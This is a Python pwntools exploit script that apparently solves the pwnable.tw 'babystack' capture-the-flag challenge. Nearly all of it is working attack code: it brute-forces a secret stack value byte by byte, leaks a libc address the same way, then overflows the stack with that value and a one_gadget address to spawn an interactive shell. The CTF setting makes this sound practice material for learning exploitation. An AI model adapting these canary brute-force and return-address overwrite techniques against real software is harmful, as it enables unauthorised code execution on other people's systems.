from pwn import *

# p = remote('chall.pwnable.tw', 10205)
p = process('./babystack', env={"LD_PRELOAD":"libc_64.so.6"})
elf = ELF('./babystack')
libc = ELF('./libc_64.so.6')
# context.terminal = ['tmux','splitw','-h']
# gdb.attach(proc.pidof(p)[0],gdbscript='''
#                                 pie b *0xdef
#                                 ''')


def bruteforce_random(p):
    random = ''
    for i in range(16):
        for j in range(1,256):
            send_password(random + chr(j) + '\x00')
            if 'Success' in p.recvline():
                random += chr(j)
                p.sendlineafter(">> ", '1')
                break
    return random

def bruteforce_libc(p):
    libc_leak = ''
    tmp = 'B' * 16 + '\x31\x0a' + 'B' * 6
    for i in range(6):
        for j in range(1, 256):
            send_password(tmp + chr(j) + '\x00')
            if 'Success' in p.recvline():
                libc_leak += chr(j)
                tmp += chr(j)
                p.sendlineafter(">> ", '1')
                break
    return u64(libc_leak.ljust(8,'\x00'))

def send_password(password):
    p.sendlineafter(">> ", '1')
    p.sendafter(" :", password)

def exit():
    p.sendlineafter(">> ", '2')

def copy(payload):
    p.sendlineafter(">> ", '3')
    p.sendafter(" :", payload)

def solve():
    one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
    canary_leak = bruteforce_random(p)
    log.info('canary leak: %s' % canary_leak.encode('hex'))

    # next we need to leak the leftover libc addr remain in stack in function main
    payload = chr(0) + 'A'*63 + 'B'*24         
    send_password(payload)          #   function to read in login has 0x7f buffer  
    copy('A'*1)                     #   function to read in copy has 0x3f buffer    => now it copies the above buffer to the stack in main function 
    p.sendlineafter('>> ', '1')

    libc_base = bruteforce_libc(p) - 0x6ffb4
    log.info('libc leak: %s' % hex(libc_base))
    one_gadget = libc_base + one_gadget[1]

    payload = ''
    payload += chr(0) + 'A' * (0x60 - 0x20 - 1)
    payload += canary_leak
    payload += 'A' * 24
    payload += p64(one_gadget)

    send_password(payload)
    copy('A' * 1)
    p.sendlineafter('>> ', '2')
    # p.sendline('cat /home/babystack/flag')
    p.interactive()

if __name__ == '__main__':
    solve()


# assumption
# bruteforce random ? => thats right
# bruteforce libc leak
# overflow to one_gadget